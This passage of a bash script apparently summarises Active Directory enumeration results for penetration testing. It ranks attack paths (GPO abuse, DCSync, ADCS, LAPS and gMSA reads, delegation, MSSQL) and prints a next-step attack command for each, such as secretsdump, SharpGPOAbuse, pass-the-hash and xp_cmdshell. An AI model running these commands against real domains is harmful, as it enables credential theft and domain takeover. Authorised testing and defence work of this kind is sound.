    "on a USER: bloodyAD ... set password <t> 'New1!'  |  GROUP: add groupMember <g> $USER  |  USER: add uac/SPN then kerberoast" "HIGH"

# GPOs I can edit = GPO abuse (SharpGPOAbuse). The WRITABLE finding above drops
# CN=Policies DNs on purpose; this is where they resurface. Authoritative sources:
# GPO DNs bloodyAD lists as writable + GPO targets BloodHound marks abusable-by-me.
GPOEDIT=$( { bodyof "$OUTDIR/18-writable-objects.txt" 2>/dev/null | grep -iE 'distinguishedName' | grep -iE 'CN=Policies,CN=System'
             awk '/^== edges a principal YOU control/{f=1;next} /^== /{f=0} f' "$OUTDIR/22-acl-edges.txt" 2>/dev/null | grep -iE 'GPO|GPLink|CN=Policies'
           } 2>/dev/null | sort -u)
if [[ -n "$GPOEDIT" ]]; then
    if grep -qiE 'Default Domain (Policy|Controllers)' <<<"$GPOEDIT"; then SEV=CRIT; else SEV=HIGH; fi
    add "GPOs this account can edit (GPO abuse)" "$GPOEDIT" \
        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $USER --GPOName '<GPO>' -> local admin on every linked host (Default Domain Policy reaches the DC). Per-GPO DACLs in 17-gpo-editable.txt" "$SEV"
fi

# DCSync: the trustees that hold replication rights on the domain root.
# Only the daclread output (17-); 18-domain-sd is every ACE and pure noise here.
DCSYNC=$(bodyof "$OUTDIR/17-dcsync-rights.txt" \
         | grep -iE 'Object type .*Get-Changes|Trustee \(SID\)' | sed 's/^[[:space:]]*/  /' | sort -u)
if [[ -n "$DCSYNC" ]]; then
    # trustees stripped of the default holders — anything left is interesting
    NONDEF=$(grep -iE 'Trustee' <<<"$DCSYNC" \
             | grep -viE 'Administrators \(S-1-5-32-544\)|Domain Controllers|Domain Admins|Enterprise Admins|Enterprise Read-only Domain Controllers|Enterprise Domain Controllers|BUILTIN\\Administrators|Local System|SYSTEM')
    # a default holder that IS a group the current user belongs to
    MYHIT=""
    while read -r g; do
        [[ -z "$g" ]] && continue
        grep -qiF "$g" <<<"$DCSYNC" && MYHIT="$g"
    done < <(bodyof "$OUTDIR/15-whoami.txt" | sed -n 's/^memberOf: CN=\([^,]*\).*/\1/p')
    grep -qiE 'Everyone|Authenticated Users|Domain Users' <<<"$DCSYNC" && MYHIT="Authenticated Users"
    if [[ -n "$NONDEF" || -n "$MYHIT" ]]; then
        add "Replication (DCSync) rights — a NON-default principal holds them" "$DCSYNC" \
            "if that principal is yours: impacket-secretsdump -just-dc $DOMAIN/$USER@$DC_IP" "CRIT"
    else
        add "Replication (DCSync) rights: DEFAULT holders only — not a path for '$USER'" "$DCSYNC" \
            "only exploitable once you are Administrators / Domain Admins / a DC" "INFO"
    fi
fi

# ADCS
ADCS=$(bodyof "$OUTDIR/23-adcs-certipy.txt" "$OUTDIR/23-adcs-nxc.txt" "$OUTDIR/09-ldap-adcs.txt" 2>/dev/null \
       | grep -iE 'ESC[0-9]|Vulnerable|Enrollment Rights|Template Name|CA Name|dNSHostName:|Certificate Authorities' | grep -viE 'Could not find any' | sort -u)
if [[ -n "$ADCS" ]]; then
    if grep -qiE 'ESC[0-9]|Vulnerable' <<<"$ADCS"; then SEV=CRIT; else SEV=INFO; fi
    add "AD CS present" "$ADCS" \
        "certipy-ad find -vulnerable -u $USER@$DOMAIN -p '<pass>' -dc-ip $DC_IP -ns $DC_IP -ldap-scheme ldap" "$SEV"
fi

LAPS=$( { bodyof "$OUTDIR/09-ldap-laps.txt" | grep -iE '^(ms-Mcs-AdmPwd|msLAPS-Password|name):'
        bodyof "$OUTDIR/16-nxc-laps.txt" | grep -iE 'Password:|AdmPwd' | grep -viE 'no result|not found|\[-\]'; } | sort -u)
[[ -n "$LAPS" ]] && add "LAPS passwords readable" "$LAPS" \
    "that is the LOCAL Administrator password: nxc smb <host> -u administrator -p '<laps-pass>' --local-auth" "CRIT"

GMSA=$(bodyof "$OUTDIR/16-nxc-gmsa.txt" | grep -iE 'Account:.*(NTLM|:::)' | grep -viE 'ERROR|no gmsa|not found|\[-\]|\[\*\]' | sort -u)
GMSA_OBJ=$(bodyof "$OUTDIR/08-ldap-gmsa.txt" | sed -n 's/^sAMAccountName: //p')
[[ -n "$GMSA" ]] && add "gMSA passwords readable" "$GMSA" "use the NT hash directly: nxc smb <host> -u '<gmsa$>' -H <nthash>" "CRIT"
[[ -z "$GMSA" && -n "$GMSA_OBJ" ]] && add "gMSA accounts exist (password not readable by us)" "$GMSA_OBJ" \
    "check msDS-GroupMSAMembership; if you control a member you can read the password" "INFO"

UNCONS=$(bodyof "$OUTDIR/08-ldap-unconstrained.txt" | grep -E '^(sAMAccountName|dNSHostName):' \
         | grep -viE "^sAMAccountName: ${DC_NAME}\\$|^dNSHostName: ${DC_FQDN}$")
[[ -n "$UNCONS" ]] && add "Unconstrained delegation (non-DC)" "$UNCONS" \
    "get admin on that host -> any incoming auth leaves a TGT in memory -> coerce a DC and impersonate it" "HIGH"

RBCD=$(bodyof "$OUTDIR/08-ldap-constrained.txt" | grep -iE 'AllowedToActOnBehalf|AllowedToDelegateTo' | sort -u)
[[ -n "$RBCD" ]] && add "Constrained / resource-based delegation configured" "$RBCD" \
    "S4U2Proxy: impacket-getST -spn <spn> -impersonate administrator $DOMAIN/<svc>" "HIGH"

MAQ=$(bodyof "$OUTDIR/08-ldap-maq.txt" "$OUTDIR/18-machine-quota.txt" "$OUTDIR/16-nxc-maq.txt" \
      | grep -iE 'ms-?DS-MachineAccountQuota' | sort -u)
if [[ -n "$MAQ" ]]; then
    # take the number that follows the attribute name, never an IP octet
    MAQN=$(grep -oiE 'MachineAccountQuota[":= ]*[0-9]+' <<<"$MAQ" | grep -oE '[0-9]+$' | sort -n | tail -1)
    if [[ "${MAQN:-0}" -gt 0 ]]; then
        add "ms-DS-MachineAccountQuota = ${MAQN} (>0: any user can add a computer)" "$MAQ" \
            "prerequisite for RBCD and for a fake computer in shadow-cred chains" "HIGH"
    else
        add "ms-DS-MachineAccountQuota = 0 (users cannot add computers)" "$MAQ" "" "INFO"
    fi
fi

COERCE=$(bodyof "$OUTDIR/24-coerce.txt" "$OUTDIR/24-zerologon.txt" "$OUTDIR/24-nopac.txt" 2>/dev/null \
         | grep -iE 'VULNERABLE|VULN\b|VULNERABLE!|VULNERABLE\b|Vulnerable' | grep -viE 'not vulnerable|NOT VULNERABLE' | sort -u)
[[ -n "$COERCE" ]] && add "Patch / coercion exposure" "$COERCE" \
    "check-only result — with unconstrained delegation or ADCS relay this becomes a DC takeover" "CRIT"

ME=$(bodyof "$OUTDIR/15-whoami.txt" | grep -E '^(sAMAccountName|memberOf|servicePrincipalName|adminCount|msDS-AllowedToDelegateTo):')
[[ -n "$ME" ]] && add "My own account" "$ME" \
    "cross-check memberOf against the adminCount list; if you are already in Domain Admins / Administrators you can DCSync now" "INFO"

ADMINS=$(bodyof "$OUTDIR/08-ldap-admincount.txt" | sed -n 's/^sAMAccountName: //p')
[[ -n "$ADMINS" ]] && add "Privileged accounts (adminCount=1)" "$ADMINS" \
    "these are the targets: kerberoast them, or find a host where they are logged on" "INFO"

TRUSTS=$(bodyof "$OUTDIR/09-ldap-trusts.txt" | grep -E '^(cn|trustDirection|flatName|trustType):')
[[ -n "$TRUSTS" ]] && add "Domain trusts" "$TRUSTS" \
    "rerun this script against the trusted domain's DC with the same credentials" "INFO"

# ---- MSSQL ------------------------------------------------------------------
MSSQLADMIN=$(bodyof "$OUTDIR/27-mssql-priv.txt" 2>/dev/null \
             | grep -iE 'sysadmin|is admin|can impersonate' | grep -viE 'not a|is not|no result' | sort -u)
MSSQLLOGIN=$(bodyof "$OUTDIR/27-mssql-login.txt" 2>/dev/null | grep -E '\[\+\]' | grep -viE '\[\*\]' | sort -u)
MSSQLLINKS=$(bodyof "$OUTDIR/27-mssql-links.txt" 2>/dev/null \
             | grep -iE '\b(SQLEXPRESS|MSSQL|data_source|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\b' | grep -viE 'no result|\[-\]' | sort -u)
if [[ -n "$MSSQLADMIN" ]]; then
    add "MSSQL: sysadmin / impersonation (RCE surface)" "${MSSQLADMIN}${MSSQLLOGIN:+$'\n'$MSSQLLOGIN}" \
        "enable + run xp_cmdshell for a shell as the SQL service account: nxc mssql <host> $NXC_AUTH -x whoami  (or impacket-mssqlclient then EXEC xp_cmdshell)" "CRIT"
elif [[ -n "$MSSQLLOGIN" ]]; then
    add "MSSQL: this account can log in" "$MSSQLLOGIN" \
        "check privileges: nxc mssql <host> $NXC_AUTH -M mssql_priv  |  query: impacket-mssqlclient $DOMAIN/$USER@<host> -windows-auth" "HIGH"
fi
[[ -n "$MSSQLLINKS" ]] && add "MSSQL: linked servers (lateral to other instances)" "$MSSQLLINKS" \
    "crawl the link: EXEC ('SELECT ...') AT [<linked>]  / impacket-mssqlclient then enum_links; links often run as sa on the remote box" "HIGH"

# ---- assemble SUMMARY.txt, worst first ---------------------------------------
cat "$SUM.crit" "$SUM.high" "$SUM.info" > "$SUM" 2>/dev/null
rm -f "$SUM.crit" "$SUM.high" "$SUM.info"

# ---- run report --------------------------------------------------------------
section "RUN REPORT"
printf '  %sOK %d%s  %sno-result %d%s  %spartial %d%s  %sfailed %d%s  %stimeout %d%s  %sskipped %d%s\n' \
    "$C_G" "$N_OK" "$C_RST" "$C_Y" "$N_EMPTY" "$C_RST" "$C_Y" "$N_PART" "$C_RST" \
    "$C_R" "$N_FAIL" "$C_RST" "$C_Y" "$N_TIME" "$C_RST" "$C_Y" "$N_SKIP" "$C_RST"
GAPS=$(grep -E '^(FAIL|TIME|SKIP|PART)' "$OUTDIR/RUN-LOG.txt" 2>/dev/null)
if [[ -n "$GAPS" ]]; then
    warn "checks that did NOT fully answer — 'no result' here means UNKNOWN, not 'nothing there':"
    sed 's/^/    /' <<<"$GAPS"
fi

if [[ ${#CRIT_LIST[@]} -gt 0 || ${#HIGH_LIST[@]} -gt 0 ]]; then
    section "TOP FINDINGS — start here"
    for t in "${CRIT_LIST[@]:-}"; do [[ -n "$t" ]] && printf '  %s[CRITICAL]%s %s\n' "$C_R$C_B" "$C_RST" "$t"; done
    for t in "${HIGH_LIST[@]:-}"; do [[ -n "$t" ]] && printf '  %s[HIGH]    %s %s\n' "$C_Y$C_B" "$C_RST" "$t"; done
    printf '  %severy finding carries its own >> NEXT line in SUMMARY.txt%s\n' "$C_C" "$C_RST"
fi

if [[ ! -s "$SUM" ]]; then
    warn "no quick win detected. Read the raw files in $OUTDIR — start with 07-ldap-users.txt"
    [[ $SECRET_SET -eq 0 ]] && info "unauthenticated runs often find nothing: get one credential, then rerun with -u/-p"
fi

rm -f "$DNSFIX"
echo
ok "done. Full output: $OUTDIR   (summary: SUMMARY.txt, per-step verdicts: RUN-LOG.txt)"
